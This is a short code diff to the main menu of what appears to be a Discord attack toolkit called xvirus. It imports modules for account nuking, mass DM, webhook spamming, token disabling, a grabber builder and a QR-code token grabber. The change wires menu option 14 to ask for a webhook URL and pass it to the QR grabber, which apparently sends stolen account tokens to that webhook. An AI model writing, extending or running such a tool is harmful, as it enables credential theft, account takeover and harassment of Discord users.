@@ -1,4 +1,5 @@
 from util.plugins.common import *
+from util.webhookgen import *
 import util.accountNuke
 import util.dmdeleter
 import util.info
@@ -15,7 +16,7 @@ import util.webhookspammer
 import util.massdm
 import util.tokendisable
 import util.vanitysniper
-from util.webhookgen import *
+import util.qrgrabb
 
 threads = 3
 cancel_key = "ctrl+x"
@@ -288,7 +289,10 @@ def main():
         exec(open('util/grabberbuilder.py').read())
 
     elif choice == '14':
-        exec(open('util/qrgrabb.py').read())
+        WebHook = input(
+            f'{Fore.RED}[>>>] Webhook Url: {Fore.RED}')
+        validateWebhook(WebHook)
+        util.qrgrabb.QR_Grabber(WebHook)
 
     elif choice == '15':
         print(f"\n{Fore.RED}(the token you input is the account that will send the reports){Fore.RESET}")
@@ -532,7 +536,6 @@ if __name__ == "__main__":
     System.Size(120, 28)
     check_wifi_connection()
     get_username()
-    Anime.Fade(Center.Center(startuplogo), Colors.rainbow, Colorate.Vertical, time=2)
     check_version()
     search_for_updates()
     proxy_file = os.getenv("temp") + "\\xvirus_proxies"
